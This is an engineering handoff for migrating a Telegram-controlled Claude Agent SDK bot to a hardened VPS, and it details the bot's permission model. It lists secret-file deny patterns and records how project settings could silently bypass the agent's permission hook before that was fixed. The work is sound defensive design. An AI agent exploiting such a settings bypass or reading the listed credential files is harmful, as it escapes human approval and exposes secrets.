# VPS + Telegram CEO Bot Migration — HANDOFF

**Task name:** VPS_TELEGRAM_MIGRATION
**Owner hat:** CEO (orchestrator)
**Created:** 2026-08-25
**Status:** IN PROGRESS — user approved scope (D1–D4) on 2026-09-06. **Phase 4 (ASPS-743) DONE & MERGED to main (PR #39, merge commit `a6dc84f`) on 2026-09-06** — bot migrated to `@anthropic-ai/claude-agent-sdk` with a deny-by-default permission model + Telegram approval flow. Gates all PASS: QA (118/118 tests, independently verified), Security (PASS after 2 remediation rounds — 3 Blockers + 2 Majors found and closed), CEO code review. Code-level follow-up residuals (Minor/Nit) tracked on ASPS-745. **Phase 1 + 2 (ASPS-740/741) provisioning scripts authored on branch `asps-740-vps-provisioning-scripts` on 2026-09-06 — `bash -n` + shellcheck clean, NOT executed (no VPS yet). Security review round 1: FAIL (1 Blocker + 2 Majors, all sshd-hardening correctness on Ubuntu 24.04). Remediated same day — see "Phase 1/2 continuation point" below — ready for security re-review.** **Phases 0, 3, 5–7 gated on the user provisioning the Hostinger VPS (Phase 0, ASPS-739).**

## JIRA
| Item | Key | Status |
|---|---|---|
| Epic — VPS + Telegram CEO agent migration | ASPS-738 | In Progress |
| Phase 0 — Provisioning & prerequisites | ASPS-739 | To Do (user action) |
| Phase 1 — VPS baseline hardening | ASPS-740 | To Do (gated on VPS) |
| Phase 2 — Runtime toolchain | ASPS-741 | To Do (gated on VPS) |
| Phase 3 — Clone repo & wire secrets | ASPS-742 | To Do (gated on VPS) |
| Phase 4 — Migrate bot to Claude Agent SDK | ASPS-743 | ✅ **Done — merged to main (PR #39, `a6dc84f`)** |
| Phase 5 — 24/7 systemd service | ASPS-744 | To Do (gated on VPS) |
| Phase 6 — Security deepening & audit | ASPS-745 | To Do (gated on VPS) |
| Phase 7 — Verification & docs | ASPS-746 | To Do |

**Gate:** Phase 4 is the only unblocked phase (pure repo code). All others need the live VPS (Phase 0, user).

---

## 1. Goal

Run the **ASPS CEO Claude agent on a persistent Hostinger VPS**, driven end-to-end
from **Telegram**, so the project can be operated 24/7 from a phone without the local
Windows machine being on.

## 2. Scope decisions (CEO defaults — override if wrong)

| # | Decision | Chosen default | Rationale |
|---|---|---|---|
| D1 | What runs on the VPS | **Telegram CEO bot + a clone of the ASPS repo.** ASPS backend stack (mysql/backend/webapi/keycloak/analyzer) **stays on Azure Container Apps.** | Small, cheap, low blast-radius. Backend migration is a separate, larger decision. |
| D2 | Claude auth on VPS | **`@anthropic-ai/claude-agent-sdk` + Claude subscription** via `CLAUDE_CODE_OAUTH_TOKEN` (from `claude setup-token`). | Full native toolset (Read/Edit/Bash/Grep/Glob/Task/MCP/skills) cross-platform; no per-token billing. |
| D3 | OS | **Ubuntu 24.04 LTS** | LTS, unattended-upgrades, best Node/.NET/Docker support. |
| D4 | Can the agent build/test ASPS on the VPS? | **Yes** — install .NET 8 SDK, Python 3.11, Docker so the CEO agent can actually build, test, and run the compose stack locally when needed. | Otherwise the agent is "read-only" and can't verify its own work. Drives VPS sizing. |

**Current state found in repo (2026-08-25):**
- Bot exists at [`apps/telegram-ceo/`](../../apps/telegram-ceo) — TypeScript, but built on the **raw** `@anthropic-ai/sdk` v0.39 with a hand-rolled agentic loop ([`src/agent.ts`](../../apps/telegram-ceo/src/agent.ts)) and **PowerShell-only** hand-rolled tools ([`src/tools.ts`](../../apps/telegram-ceo/src/tools.ts)). Won't run on Linux as-is.
- Auth: Telegram user-ID allow-list (`AUTHORIZED_USERS`). In-memory sessions. Model `claude-sonnet-4`.
- ASPS deployed on Azure (see `docs/cloud/`). Repo: `github.com/isaacmendelson/ASPS`.

---

## 3. Target architecture

```
 Phone (Telegram app)
        │  HTTPS long-poll / webhook
        ▼
 ┌──────────────────────────────────────────────┐
 │  Hostinger VPS (Ubuntu 24.04 LTS)             │
 │                                               │
 │  systemd: telegram-ceo.service (non-root user)│
 │    node-telegram-bot-api  ──▶  Claude Agent   │
 │                                 SDK query()    │
 │      • auth: CLAUDE_CODE_OAUTH_TOKEN           │
 │      • cwd: /home/aspsbot/ASPS (git clone)     │
 │      • tools: Read/Edit/Bash/Grep/Glob/Task/MCP│
 │      • MCP: knowledge-engine, jira, github     │
 │                                               │
 │  toolchain: Node 20, .NET 8, Python 3.11, Docker│
 │  firewall: UFW (SSH only) · fail2ban · auto-upd│
 └──────────────────────────────────────────────┘
        │ git push / gh PR              │ REST
        ▼                               ▼
   GitHub (ASPS repo)            Azure Container Apps
                                 (ASPS backend — unchanged)
```

---

## 4. Phased plan

Phased execution (Mode B): finish a phase → report → wait for "תמשיך" before the next.

### Phase 0 — Provisioning & prerequisites (user + CEO)
- **User buys** Hostinger VPS. Recommended: **KVM 2** (2 vCPU / 8 GB RAM / 100 GB) minimum if the agent must build .NET + run Docker compose; **KVM 1** (1 vCPU / 4 GB) is enough for bot + repo edits only. Ubuntu 24.04 template.
- User provides (into `ACCESS_KEYS.env`, never committed): VPS IP, initial root creds, Telegram bot token, authorized Telegram user IDs.
- CEO/user generate `CLAUDE_CODE_OAUTH_TOKEN` locally via `claude setup-token` (subscription).
- GitHub access for the clone: **fine-grained PAT** or **deploy key** scoped to `isaacmendelson/ASPS` (contents R/W + PRs). Store in `ACCESS_KEYS.env`.
- **Deliverable:** confirmed VPS, all secrets staged locally. No code yet.

### Phase 1 — VPS baseline hardening (BEFORE anything else) — owner: devops + security
Do this first, on the fresh box, over the initial root session:
1. `apt update && full-upgrade`; enable `unattended-upgrades`.
2. Create non-root sudo user `aspsbot`; copy SSH key; disable password auth.
3. Harden `sshd_config`: `PermitRootLogin no`, `PasswordAuthentication no`, `PubkeyAuthentication yes`, non-default port (optional), `AllowUsers aspsbot`.
4. UFW: default deny incoming, allow only SSH (chosen port). Bot uses **outbound** long-poll → no inbound port needed. (If webhook mode later, allow 443 + reverse proxy.)
5. `fail2ban` for sshd.
6. Timezone, hostname, swap file (esp. on 4 GB box for builds).
- **Deliverable:** hardened box, key-only SSH, firewall up. Security agent PASS on baseline.
- **STATUS (2026-09-06): scripts authored, security remediation round 1 applied, NOT executed.** See "Phase 1/2 continuation point" below — `deploy/vps/01-harden.sh` on branch `asps-740-vps-provisioning-scripts`, now security-re-review-ready. Waiting on Phase 0 (ASPS-739, user provisions the real VPS) before this can actually run and be verified.

### Phase 2 — Runtime toolchain — owner: devops
- Node.js 20 LTS (nvm or NodeSource), `git`, `ripgrep`, `build-essential`.
- Claude Code CLI (for `setup-token` + as SDK dependency): `npm i -g @anthropic-ai/claude-code`.
- Per D4: .NET 8 SDK, Python 3.11 + venv, Docker Engine + compose plugin (add `aspsbot` to `docker` group — note this is a privilege boundary; security to review).
- **Deliverable:** `dotnet --version`, `node -v`, `python3 --version`, `docker ps` all green.
- **STATUS (2026-09-06): scripts authored, security remediation round 1 applied, NOT executed.** See "Phase 1/2 continuation point" below — `deploy/vps/02-toolchain.sh` on the same branch. Same Phase 0 gate as Phase 1.

### Phase 3 — Clone repo & wire secrets — owner: devops
- `git clone` ASPS into `/home/aspsbot/ASPS` via deploy key/PAT.
- Recreate the repo-local `ACCESS_KEYS.env` on the box (chmod 600, gitignored) with GitHub + JIRA tokens.
- Create `apps/telegram-ceo/.env` (chmod 600): `TELEGRAM_BOT_TOKEN`, `AUTHORIZED_USERS`, `WORKING_DIR=/home/aspsbot/ASPS`, `CLAUDE_CODE_OAUTH_TOKEN`, model, max tokens.
- Configure git identity + credential helper so agent `git push` works headless.
- **Deliverable:** repo builds on VPS (`dotnet build`), secrets present & 600, nothing new committed.

### Phase 4 — Migrate bot to Claude Agent SDK — owner: backend (TS) + architect review
Replace the raw-SDK loop with the Agent SDK so the bot gets the full, cross-platform toolset.
1. Swap dep: `@anthropic-ai/sdk` → `@anthropic-ai/claude-agent-sdk`.
2. Rewrite [`src/agent.ts`](../../apps/telegram-ceo/src/agent.ts) to use the SDK `query()` streaming loop; drop the hand-rolled PowerShell tools in [`src/tools.ts`](../../apps/telegram-ceo/src/tools.ts) (SDK provides Read/Edit/Bash/Grep/Glob/Task natively — bash now runs `/bin/bash`).
3. Keep [`src/bot.ts`](../../apps/telegram-ceo/src/bot.ts) Telegram plumbing + user allow-list; map SDK streaming events → Telegram typing/partial messages; keep `/reset` `/model` `/reload`.
4. Set `cwd` to the repo, load `CLAUDE.md` system context automatically (SDK reads project settings), wire MCP servers already in `.mcp.json` (knowledge-engine) + GitHub/JIRA.
5. **Permission model:** run SDK in a restricted permission mode (e.g. deny-by-default for destructive Bash, mirror the existing `DANGEROUS_PATTERNS` block via an SDK `canUseTool` hook) — Telegram is a low-friction surface, keep the guardrails.
6. **TDD:** characterization test for the current bot behavior first; unit tests for auth gate, permission hook, streaming adapter. Red → Green.
- **Deliverable:** bot answers in Telegram using SDK toolset; QA PASS; auth + destructive-command guard tested.

### Phase 5 — 24/7 service — owner: devops
- `systemd` unit `telegram-ceo.service`: `User=aspsbot`, `Restart=always`, `EnvironmentFile=.env`, `WorkingDirectory=repo`, journald logging.
- Log rotation; restart-on-crash; optional watchdog `/start` ping.
- **Deliverable:** `systemctl status` active; survives reboot; logs clean of secrets.

### Phase 6 — Security deepening & audit — owner: security (CISO)
- Confirm secrets never in git / logs / journald; `.env` + `ACCESS_KEYS.env` 600, gitignored.
- Confirm Telegram allow-list enforced on every update (incl. edited/callback).
- Confirm destructive-command guard and permission hook cannot be bypassed.
- Confirm OAuth token scope; rotation plan documented.
- Docker-group privilege note reviewed and accepted or mitigated.
- Full-box `security-review` + entry in `docs/security-audits/`.
- **Deliverable:** Security PASS with findings table; NEEDS_ATTENTION updated.

### Phase 7 — Verification & docs — owner: CEO + tech-writer
- End-to-end from phone: ask a question, read a file, run a build, open a PR — all via Telegram.
- Update `docs/cloud/` (new VPS component), this handoff, and a short runbook (`docs/cloud/VPS_TELEGRAM_RUNBOOK.md`).
- **Deliverable:** signed-off cutover; runbook exists.

---

## 5. Risks & open items
- **Docker-in-agent privilege:** `docker` group ≈ root. Security must accept or sandbox.
- **Backend still on Azure:** agent edits/builds locally but deploy path to Azure unchanged — confirm the agent has the Azure creds/pipeline access it needs, or keep deploys manual.
- **Subscription OAuth token on a server:** treat as a high-value secret; rotation + revoke plan required.
- **VPS sizing vs. .NET/Docker builds:** 4 GB may thrash; 8 GB recommended if D4 stays "yes".
- **Runaway agent cost/actions over Telegram:** permission mode + iteration caps + allow-list are the controls.

## 6. Continuation point (next agent)

### Phase 4 (ASPS-743) — backend implementation complete, awaiting QA + code review

Branch `asps-743-migrate-telegram-bot-to-claude-agent-sdk`, pushed to remote. Not merged — QA + CEO code review still required before merge/PR (per task-workflow.md).

**Changed files:**
- `apps/telegram-ceo/package.json` — dropped `@anthropic-ai/sdk` as the primary dep, added `@anthropic-ai/claude-agent-sdk` (+ `@anthropic-ai/sdk` as its peer, needed only for a `BetaMessage` type import inside the SDK's own `.d.ts`); added `vitest` devDep + `test`/`test:watch` scripts.
- `apps/telegram-ceo/package-lock.json` — regenerated by `npm install`.
- `apps/telegram-ceo/tsconfig.json` — excludes `src/**/*.test.ts` and `src/__tests__/**` from the `tsc` build (tests run via vitest, not compiled to `dist/`).
- `apps/telegram-ceo/src/agent.ts` — rewritten: raw hand-rolled agentic loop replaced with `query()` from `@anthropic-ai/claude-agent-sdk`. Exports `canUseTool` (the permission guard) and `runAgent(userId, message, onEvent?)`. `reloadSystemPrompt()` kept as a documented no-op (see decisions below).
- `apps/telegram-ceo/src/security.ts` — **new**. Single source of truth for `DANGEROUS_BASH_PATTERNS` (same 6 patterns as the old `tools.ts` denylist, unchanged) + `matchDangerousBashCommand()`. Imported by `agent.ts`'s `canUseTool` and by tests — no duplication.
- `apps/telegram-ceo/src/context.ts` — rewritten: no longer hand-reads `CLAUDE.md`/hat files from disk (the SDK's `settingSources: ["project"]` does this natively, and the agent self-onboards via CLAUDE.md's own "at session start" instructions, same as an interactive Claude Code session). Now only exports `TELEGRAM_SYSTEM_PROMPT_APPEND`, a short Telegram-transport-specific addendum (char limit, Markdown flavor, no live terminal on the other end). **[SUPERSEDED — see the "SECURITY REMEDIATION" section below.]** `settingSources: ["project"]` was itself found to be the root cause of security Blocker B3 (it silently re-authorizes `Bash(*)`/`Write`/`Edit` via `.claude/settings.json`, bypassing `canUseTool` entirely) and was replaced with `settingSources: []`; `context.ts` grew back `loadClaudeMd`/`loadMcpServers` to read `CLAUDE.md`/`.mcp.json` by hand instead of relying on this auto-load. The final, current behavior is documented in `README.md`'s "Permission model" section and in the code comments of `agent.ts`/`context.ts` — do not treat this paragraph as describing the shipped code.
- `apps/telegram-ceo/src/session.ts` — rewritten: stores an SDK session id per Telegram user id (`getSessionId`/`setSessionId`/`clearSession`) instead of a raw message-array history, since the SDK/CLI persists conversation history itself and multi-turn is driven by the `resume` option.
- `apps/telegram-ceo/src/bot.ts` — Telegram plumbing preserved (`node-telegram-bot-api` polling, `AUTHORIZED_USERS` allow-list, `/start` `/reset` `/model` `/reload`, typing indicator, message splitting). Hardened: every command handler now guards `!msg.from` before the allow-list check (was a `!` non-null assertion). **Added** `edited_message` and `callback_query` handlers that also enforce the allow-list (previously unhandled — no exploit existed since no processing occurred, but the task explicitly required auth enforcement on every inbound update type). Typing-indicator restart callback now receives an `SDKMessage` per streamed event (was a bare tool-round callback).
- `apps/telegram-ceo/src/index.ts` — required-env check no longer hard-requires `ANTHROPIC_API_KEY`; now requires `TELEGRAM_BOT_TOKEN` + `AUTHORIZED_USERS`, plus **either** `CLAUDE_CODE_OAUTH_TOKEN` or `ANTHROPIC_API_KEY`. Startup log reports which auth mode is active.
- `apps/telegram-ceo/src/tools.ts` — **deleted**. All PowerShell-only hand-rolled tools (`read_file`/`write_file`/`edit_file`/`bash`/`grep`/`glob`/`list_directory`) are replaced by the SDK's native, cross-platform toolset (Read/Write/Edit/Bash/Grep/Glob/Task/MCP); Bash now runs the host's own shell (`/bin/bash` on Linux, PowerShell on Windows).
- `apps/telegram-ceo/src/__tests__/security.test.ts`, `session.test.ts`, `agent.test.ts`, `bot.test.ts` — **new**, vitest. Mock `@anthropic-ai/claude-agent-sdk`'s `query()` and `node-telegram-bot-api` — no real network/API calls.
- `apps/telegram-ceo/.env.example` — new vars: `CLAUDE_CODE_OAUTH_TOKEN` (preferred), `ANTHROPIC_API_KEY` (fallback), `MAX_TURNS` (replaces `MAX_TOKENS`), `MODEL` now optional/blank-by-default. `WORKING_DIR`/`TELEGRAM_BOT_TOKEN`/`AUTHORIZED_USERS` unchanged.
- `apps/telegram-ceo/README.md` — rewritten: SDK-based architecture, subscription-token auth, native toolset, permission-guard model, session/resume model, `/reload`'s new (inherent) semantics, test instructions.
- `apps/telegram-ceo/.env` — **not modified** (gitignored, local-only, contained only placeholder values already — `your-bot-token-here` etc., no real secrets). User should update it to match the new `.env.example` shape (rename `MAX_TOKENS`→`MAX_TURNS`, add `CLAUDE_CODE_OAUTH_TOKEN`) before running the bot for real.

**Decisions / SDK-reference deltas found while implementing (installed version `@anthropic-ai/claude-agent-sdk@0.3.261`):**
1. **Session/multi-turn mechanism:** confirmed `resume: string` (session id) on `Options`, and every `result` `SDKMessage` (success or error) carries `session_id`. Design: `prompt` is passed as a plain string per Telegram message (not an `AsyncIterable`); the per-user in-memory map (`session.ts`) stores the last `session_id` and passes it back as `resume` on the next call. `/reset` deletes the map entry. This matches the reference's suggested approach exactly.
2. **`canUseTool` return type nuance:** the actual installed type is `(toolName, input, options) => Promise<PermissionResult | null>`, and the inline JSDoc is explicit that `null` must only be returned after sending a control_response out-of-band — an accidental `null` "leaves the tool call blocked indefinitely." Our hook always resolves to `{behavior:'allow'}` or `{behavior:'deny', message}`, never `null`. Verified with a dedicated test (`agent.test.ts` — "never resolves to null").
3. **`PermissionResult` deny shape:** `message` is a **required** string on the deny variant (not optional as the outer `CanUseTool` inline options-type JSDoc first suggested) — implemented accordingly.
4. **`reloadSystemPrompt()` became a no-op:** with `settingSources: ["project"]`, the SDK spawns a fresh Claude Code process **per `query()` call** and re-reads `CLAUDE.md`/project settings from disk every turn — there was no persistent in-process system-prompt cache left to invalidate (unlike the old code, which cached `loadSystemPrompt()`'s file reads in a module-level variable). `/reload` is kept only for Telegram UX continuity; documented as inherent behavior in code comments + README.
5. **`context.ts` scope reduced:** no longer hand-loads `CLAUDE.md` + hat files (`.claude/hats/ceo/*`, `.claude/team/CHARTER.md`) — `settingSources: ["project"]` loads `CLAUDE.md` (and `.mcp.json`) automatically, and the agent follows CLAUDE.md's own "read PROJECT_CONTEXT.md → CHARTER.md → hats/ceo/INDEX.md" instructions itself, the same way an interactive Claude Code session self-onboards. `context.ts` now only holds a short Telegram-transport addendum. This is a deliberate behavior improvement (agent self-orients exactly like Claude Code, instead of being fed a hand-curated file subset) — flagging in case QA/architect wants to confirm this matches intent. **[SUPERSEDED — see the "SECURITY REMEDIATION" section below.]** `settingSources: ["project"]` was reverted to `[]` because it also auto-loads `.claude/settings.json`'s `permissions.allow`, bypassing `canUseTool` (security Blocker B3). `context.ts` grew `loadClaudeMd`/`loadMcpServers` back to keep the same self-onboarding behavior without the auto-load side effect — do not read this point as describing the current `settingSources` value.
6. **MCP wiring:** used `settingSources: ["project"]` (auto-loads `.mcp.json` → `knowledge-engine` server) + `allowedTools: ["mcp__knowledge-engine__knowledge_search", "mcp__knowledge-engine__knowledge_ask"]` so those specific MCP tool calls don't stall on a permission prompt. Did not pass an explicit `mcpServers` option — relying on the project-settings auto-load per the task's own instruction. **[SUPERSEDED — see the "SECURITY REMEDIATION" section below.]** The final design passes `mcpServers` explicitly (via `context.ts`'s `loadMcpServers`) plus `strictMcpConfig: true`, precisely because `settingSources: ["project"]`'s auto-discovery could not be used without also inheriting the unsafe `permissions.allow` rules.
7. **`@anthropic-ai/sdk` still needed as a dependency:** even though no code imports it directly anymore, `@anthropic-ai/claude-agent-sdk`'s own `sdk.d.ts` does `import type { BetaMessage } from '@anthropic-ai/sdk/resources/beta/messages/messages.mjs'` for its `SDKAssistantMessage.message` field type. Declared as a normal dependency (`^0.93.0`, matching the SDK's peer-dependency constraint) so `tsc` can resolve it — `npm install` failed with an `ERESOLVE` peer conflict against the old `^0.39.0` pin until this was bumped.
8. **Tool availability vs. `allowedTools`:** left the `tools` option unset (defaults to the full native Claude Code toolset) — `allowedTools` in the SDK is only an auto-approval list, not a tool-availability filter (per the installed types' own JSDoc), so it doesn't need to enumerate the native tools to keep them available.

**TDD evidence:**
- Acceptance checklist translated to tests before/alongside implementation: (a) destructive Bash command denied by `canUseTool`, (b) benign Bash/other tools allowed, (c) `canUseTool` never resolves `null`, (d) unauthorized Telegram user blocked from the agent on `message`, `edited_message`, and `callback_query`, (e) authorized user's message reaches `runAgent` and the reply is sent, (f) `/reset` clears session, (g) `/reload` calls the reload hook, (h) multi-turn `resume` wiring (first call has no `resume`, second call resumes the stored session id), (i) `onEvent` fires once per streamed `SDKMessage` (typing-indicator hook).
- **Red evidence** (captured 2026-09-06, then reverted): temporarily stubbed `canUseTool` in `agent.ts` to always `{behavior:'allow'}` and removed the auth check in `bot.ts`'s `message` handler (kept only the `!msg.from` guard) → ran `npx vitest run src/__tests__/agent.test.ts src/__tests__/bot.test.ts` → 2 failures exactly as expected:
  - `canUseTool ... denies a Bash call matching the destructive-command denylist` → `expected 'allow' to be 'deny'`
  - `bot auth gate ... blocks an unauthorized user's message from reaching the agent` → `expected "spy" to not be called at all, but actually been called 1 times`
  - 15 other tests in those two files still passed (isolated, non-security assertions unaffected).
- **Green evidence:** reverted both files to the real implementation, re-ran the full suite:
  ```
  cd apps/telegram-ceo && npx vitest run
  Test Files  4 passed (4)
       Tests  37 passed (37)
  ```
  Files: `security.test.ts` (17 tests), `session.test.ts` (3), `agent.test.ts` (10), `bot.test.ts` (7).
- **Build:** `npm run build` (tsc) — clean, 0 errors. `dist/` verified to contain no test files (tsconfig excludes `src/__tests__/**` and `*.test.ts`) and no stale `tools.js` (did a clean `rm -rf dist && npm run build`).
- Exact commands: `cd apps/telegram-ceo && npm install && npm run build && npx vitest run` (or `npm test`).

**Not exercised (documented, not blocking):** `index.ts`'s env-validation branches (`process.exit` on missing vars) and `startBot`'s live-polling path aren't unit tested — they're thin process-lifecycle wrappers around already-tested logic (`bot.ts`'s handlers). No real Telegram/Anthropic network calls are made anywhere in the suite.

**Specs potentially affected (not edited — CEO/Architect/TechWriter own spec updates per task-workflow.md):**
- None of `docs/system-specifications/` document the Telegram CEO bot today (it isn't part of the ASPS product surface — it's an internal ops tool for operating the project itself). No system-specification, ICD, or data-flow doc appears to need updating for this change. Flagging for TechWriter/Architect to confirm — if a "VPS / ops tooling" doc category doesn't exist yet, `docs/task-memory/VPS_TELEGRAM_MIGRATION_HANDOFF.md` (this file) is currently the only design record, and Phase 7 of this same task already plans a dedicated runbook (`docs/cloud/VPS_TELEGRAM_RUNBOOK.md`).

**Next steps for CEO/QA (superseded by the remediation below — kept for history):**
1. ~~QA review on branch...~~ QA PASSED functionally. Security review then returned **FAIL with 3 Blockers** (autonomous file-access confinement, Bash denylist as sole control, unbounded autonomous blast radius + dead `allowedTools` + settings precedence). See remediation section immediately below.

---

### Phase 4 (ASPS-743) — SECURITY REMEDIATION (2026-09-06)

**Trigger:** Security review FAIL (3 Blockers) after functional QA PASS. User (CEO's boss) chose the permission model: **read-mostly + mandatory human (Telegram) approval for every state-changing action**, plus **path guard + secrets-outside-cwd** posture. This section documents the fix, implemented on the same branch (`asps-743-migrate-telegram-bot-to-claude-agent-sdk`).

**Changed/added files:**
- `apps/telegram-ceo/src/security.ts` — added a second SSOT export, `SECRET_PATH_PATTERNS` (`*.env`, `*.key`, `*.pem`, `*.pfx`, `id_rsa*`, `*.ppk`, `ACCESS_KEYS*`, `.ssh`/`.aws`/`.gnupg` segments) + `matchSecretPath()`, and the path guard itself, `checkPathAllowed(rawPath, workingDir)` — resolves symlinks/`..` (walking up to the nearest existing ancestor for not-yet-existing Write targets), denies secret patterns unconditionally, denies anything outside `workingDir`. `DANGEROUS_BASH_PATTERNS`/`matchDangerousBashCommand` unchanged (still the Bash hard-deny, now explicitly documented as defense-in-depth, not the primary control).
- `apps/telegram-ceo/src/approvals.ts` — **new**. Decoupled Telegram-approval-flow module (no circular import between `agent.ts`/`bot.ts`): `requestApproval(userId, toolName, summary)` returns a `Promise<"allow"|"deny">`, resolved by `resolveApproval(id, fromUserId, decision)` (only the requesting user's id may resolve it) or by an `APPROVAL_TIMEOUT_MS`-driven timeout (default 60s) that fails closed to `"deny"`. `setApprovalRequestHandler()` lets `bot.ts` inject the actual Telegram transport without `approvals.ts` knowing anything about Telegram.
- `apps/telegram-ceo/src/agent.ts` — rewritten permission model: `canUseTool` (now `createCanUseTool(userId, workingDir)`, built fresh per Telegram turn so approvals correlate to the right user) implements **deny-by-default**: (1) path guard for any tool carrying a path (`Read`/`Edit`/`Write`/`NotebookEdit`/`Grep`/`Glob`), (2) Bash hard-deny for `DANGEROUS_BASH_PATTERNS`, (3) auto-allow only `Read`/`Grep`/`Glob` + the 2 read-only knowledge-engine MCP tools, (4) everything else routed through `requestApproval`. `buildOptions()` now sets `settingSources: []` (was `["project"]`) — see the precedence finding below — and wires `.mcp.json` + `CLAUDE.md` by hand instead (via `context.ts`).
- `apps/telegram-ceo/src/context.ts` — added `loadClaudeMd(workingDir)` (reads `CLAUDE.md` fresh every turn, replacing the SDK's auto-load) and `loadMcpServers(workingDir)` (reads `.mcp.json`'s `mcpServers` map, replacing SDK auto-discovery). `TELEGRAM_SYSTEM_PROMPT_APPEND` gained one line telling the model that state-changing calls will pause for Telegram approval — not an error.
- `apps/telegram-ceo/src/bot.ts` — wires `setApprovalRequestHandler` at startup to `sendApprovalRequest()` (sends an inline-keyboard message — ✅ Approve / ❌ Deny — to the requesting user's chat, correlated by request id in `callback_data`). `callback_query` handler now parses `approve:<id>`/`deny:<id>` and calls `resolveApproval`, acking every query identically (no text) whether unauthorized, wrong-user, or unknown-id, to avoid enumeration. Message handler: restricted to `msg.chat.type === "private"`; unauthorized senders dropped silently (removed the "Unauthorized…" reply); agent errors now reply with a generic message while the real error (`err.stack`) is logged server-side only. Startup log now prints the authorized-user **count**, never the id list.
- `apps/telegram-ceo/.env.example` — added `APPROVAL_TIMEOUT_MS` (default 60000) + a deployment note that `.env` should live outside `WORKING_DIR` in production (actual relocation on the VPS stays ASPS-745).
- `apps/telegram-ceo/README.md` — rewritten permission-model section: truthful description of the path guard, the approval flow, the Bash denylist as defense-in-depth (not primary control), and a dedicated subsection on the SDK precedence finding (below). Removed the old "auto-allowed... execute automatically... nobody present to answer a prompt" framing that the security review correctly flagged as false/misleading.
- `apps/telegram-ceo/src/__tests__/security.test.ts` — added `matchSecretPath` + `checkPathAllowed` tests (uses real temp dirs via `mkdtempSync`/`realpathSync`, no mocks).
- `apps/telegram-ceo/src/__tests__/approvals.test.ts` — **new**. Correlation, wrong-user, timeout (via `vi.useFakeTimers()`), concurrent-requests, no-transport-wired-fails-closed.
- `apps/telegram-ceo/src/__tests__/agent.test.ts` — rewritten around `createCanUseTool(userId, workingDir)` (was a bare `canUseTool` export): path-guard integration, Bash hard-deny still not routed through approval, deny-by-default for every non-auto-allow tool (`Write`/`Edit`/`NotebookEdit`/`Task`/`WebFetch`/an unclassified MCP tool/an arbitrary unclassified tool name), `settingSources` must be `[]`, `mcpServers`/`strictMcpConfig` wired by hand, system-prompt append contains both the (mocked) CLAUDE.md content and the Telegram addendum.
- `apps/telegram-ceo/src/__tests__/bot.test.ts` — rewritten: private-chat-only trigger, silent drop of unauthorized messages, generic error message + server-side detail logging, authorized-user-count-only startup log, and a full approval-flow integration using the **real** `approvals.js` module (not mocked) — send inline keyboard → extract `callback_data` → simulate `callback_query` → assert resolution, including the wrong-user-does-not-resolve case (redesigned to use a *different* decision for the stranger's tap vs. the real user's tap, so the assertion actually discriminates a correct vs. broken correlation check — see Red evidence below, an earlier draft of this test could not tell the difference).

**SDK permission-precedence finding (the core question the task required an answer to):**

Investigated the installed `@anthropic-ai/claude-agent-sdk@0.3.x` types (`sdk.d.ts`) and empirically verified with the SDK's own `resolveSettings()` API (resolves the effective settings cascade **without spawning the Claude CLI** — safe to run standalone):

```js
import { resolveSettings } from "@anthropic-ai/claude-agent-sdk";
await resolveSettings({ cwd: "C:\\Jobs\\ASPS\\GitHub\\Software", settingSources: ["project"] });
// → effective.permissions.allow includes "Bash(*)", "Write", "Edit", "Read", "Glob", "Grep", "Agent", ...
//   provenance.permissions = { source: "project", path: ".../.claude/settings.json" }
await resolveSettings({ cwd: "C:\\Jobs\\ASPS\\GitHub\\Software", settingSources: [] });
// → effective: {}, sources: [] — zero rules from any source
```

Findings:
1. `settingSources: ["project"]` (the old design) loads `.claude/settings.json` from the repo root, which pre-authorizes `Bash(*)`, `Write`, `Edit`, `Read`, `Glob`, `Grep`, `Agent` via `permissions.allow` — confirmed present in the merged effective settings.
2. The SDK's own docs for the **top-level `Options.allowedTools`** field (a mechanism our code already deliberately uses for the 2 knowledge-engine MCP tools) state matching tools "execute automatically without asking the user for approval" — i.e. bypass `canUseTool` outright. `settings.permissions.allow` is the settings-file equivalent of the same mechanism (standard, long-documented Claude Code semantics: allow/ask/deny rules, where a matching `allow` rule is resolved without an interactive/host prompt).
3. Net effect: with `settingSources: ["project"]`, a `Write`/`Edit`/`Bash(*)` call matching the project's own `.claude/settings.json` would have been approved by the **settings engine**, never reaching `canUseTool` at all — silently re-opening every tool this remediation locks down, regardless of what `canUseTool` itself would have decided. This is exactly the Blocker the security review flagged.
4. **Fix:** `settingSources: []` (SDK "isolation mode"), confirmed via `resolveSettings` to yield zero effective permission rules from any filesystem source. `canUseTool` is now the sole, unconditional authority for every tool call — no settings file, local or otherwise, can bypass it. `CLAUDE.md` and `.mcp.json` (previously auto-loaded by `"project"`) are now read and wired by hand (`context.ts`'s `loadClaudeMd`/`loadMcpServers`, `Options.mcpServers` + `strictMcpConfig: true`) so project context and MCP access are unaffected.
5. Residual note for security/architect re-review: `resolveSettings()` is documented as an `@alpha` API in the installed SDK version. It was used only as a **read-only diagnostic** to confirm the settings cascade (no code path depends on it at runtime — `buildOptions()` just hardcodes `settingSources: []`), so its alpha status does not create a runtime dependency risk, but flagging in case a future SDK version changes its behavior or removes it — the actual fix (`settingSources: []`) does not rely on this API existing.
6. This was resolved without needing to escalate the open question in the task — the empirical evidence was conclusive and the fix (isolation mode + manual CLAUDE.md/`.mcp.json` wiring) fully avoids the ambiguity rather than depending on cross-tier `ask`-beats-`allow` precedence assumptions that could not be verified without a live CLI run.

**TDD evidence (Red → Green), exact commands: `cd apps/telegram-ceo && npx tsc --noEmit && npm run build && npx vitest run` (or `npm test`):**

- **Red #1 — path guard disabled** (`checkPathAllowed` short-circuited to always return `{allowed:true}`): `npx vitest run src/__tests__/security.test.ts src/__tests__/agent.test.ts` → **7 failed / 66 passed** (the `.env` denial, `.ssh` denial, `..`-escape, absolute `/etc/passwd`, secret-path-outside-tree tests in `security.test.ts`, plus the two `agent.test.ts` path-guard-integration tests). Reverted; re-ran green.
- **Red #2 — deny-by-default disabled** (`createCanUseTool`'s post-Bash-hard-deny branch short-circuited to `return {behavior:"allow"}` unconditionally, i.e. the pre-remediation behavior): `npx vitest run src/__tests__/agent.test.ts` → **12 failed / 20 passed** (every "requires Telegram approval for X" test, the approve/deny/timeout-routing tests, and the user-correlation test in the deny-by-default `describe` block). Reverted; re-ran green.
